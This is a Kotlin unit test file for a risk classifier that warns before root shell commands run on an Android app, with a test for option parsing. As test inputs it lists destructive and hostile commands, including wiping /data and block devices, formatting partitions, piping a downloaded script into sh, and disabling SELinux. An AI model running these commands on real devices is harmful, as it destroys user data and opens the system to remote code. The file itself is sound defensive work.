package com.minisx.app.offload

import com.minisx.app.offload.RootCommandRisk.Risk
import com.minisx.app.sandbox.offload.RootOffloadHandler
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class RootCommandRiskTest {

    private fun risks(c: String) = RootCommandRisk.assess(c)

    @Test fun `harmless commands carry no warning`() {
        assertTrue(risks("id").isEmpty())
        assertTrue(risks("ls -l /data/local/tmp").isEmpty())
        assertTrue(risks("cat /proc/cpuinfo | head -5").isEmpty())
        assertTrue(risks("pm list packages").isEmpty())
        assertTrue(risks("dumpsys battery").isEmpty())
    }

    @Test fun `deleting and wiping are the serious ones`() {
        assertTrue(Risk.DELETES_FILES in risks("rm -rf /data/local/tmp/x"))
        assertTrue(Risk.WIPES_DATA in risks("dd if=/dev/zero of=/dev/block/sda1"))
        assertTrue(Risk.WIPES_DATA in risks("rm -rf /data"))
        assertTrue(Risk.WIPES_DATA in risks("mkfs.ext4 /dev/block/x"))
    }

    @Test fun `a risk inside a chain is found`() {
        assertTrue(Risk.REBOOT_OR_SHUTDOWN in risks("sync && reboot"))
        assertTrue(Risk.DELETES_FILES in risks("cd /x; rm a.txt"))
    }

    @Test fun `a download piped into a shell`() {
        assertTrue(Risk.DOWNLOADS_AND_RUNS in risks("curl -s https://x.example/i.sh | sh"))
        assertFalse(Risk.DOWNLOADS_AND_RUNS in risks("curl -s https://x.example/i.json | head"))
    }

    @Test fun `app, settings and process changes`() {
        assertTrue(Risk.REMOVES_APPS in risks("pm uninstall com.x"))
        assertTrue(Risk.REMOVES_APPS in risks("pm clear com.x"))
        assertTrue(Risk.CHANGES_SETTINGS in risks("settings put global airplane_mode_on 1"))
        assertTrue(Risk.STOPS_PROCESSES in risks("am force-stop com.x"))
        assertTrue(Risk.EDITS_SECURITY in risks("setenforce 0"))
        assertTrue(Risk.REMOUNTS_SYSTEM in risks("mount -o rw,remount /system"))
        assertTrue(Risk.RECURSIVE_PERMISSIONS in risks("chmod -R 777 /data/x"))
        assertTrue(Risk.WRITES_SYSTEM_FILES in risks("echo x > /system/etc/hosts"))
    }

    @Test fun `serious risks are listed first and each only once`() {
        val r = risks("am force-stop com.x; rm -rf /sdcard/a; rm b")
        assertEquals(r.distinct(), r)
        assertTrue(r.first().high)
    }

    @Test fun `the reason is read from the options`() {
        val e = RootOffloadHandler.parseExec(listOf("--reason", "배터리 상태 확인", "dumpsys", "battery"))!!
        assertEquals("dumpsys battery", e.command)
        assertEquals("배터리 상태 확인", e.reason)
        assertEquals("x", RootOffloadHandler.parseExec(listOf("--reason=x", "--timeout", "5", "id"))!!.reason)
        assertEquals(null, RootOffloadHandler.parseExec(listOf("id"))!!.reason)
        assertEquals(null, RootOffloadHandler.parseExec(listOf("--reason")))
    }
}
